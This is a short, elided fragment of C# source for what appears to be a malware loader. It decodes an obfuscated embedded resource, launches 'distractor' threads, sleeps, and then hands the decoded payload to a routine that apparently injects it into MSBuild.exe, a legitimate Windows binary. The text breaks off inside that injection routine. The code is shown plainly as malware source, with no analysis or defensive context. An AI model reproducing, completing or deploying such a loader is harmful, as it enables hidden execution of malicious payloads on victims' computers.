...
namespace gourou
{
    internal class Program
    {
        ...
        {
            String b6 = (gourou.Properties.Resources.dellksqldksqlkdlsqkdqs);
            String dec = D3crypt10nUt1lity.D3cryptB45364(b6);

            DistractorThreads.StartDistractingThreads();

            Thread.Sleep(5000);
            string ossama = @"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe";

            Rnn.Rn(ossama, Convert.FromBase64String(dec), false);
    ...
    public static class Rnn
    {
        ...
        public static bool Rn(string path, byte[] data, bool protect)
        {
            for (int I = 1; I <= 5; I++)
                if (Hdnl(path, data, protect)) return true;
            return false;
        }
        private static bool Hdnl(string path, byte[] data, bool protect)
        {
            int readWrite = 0;
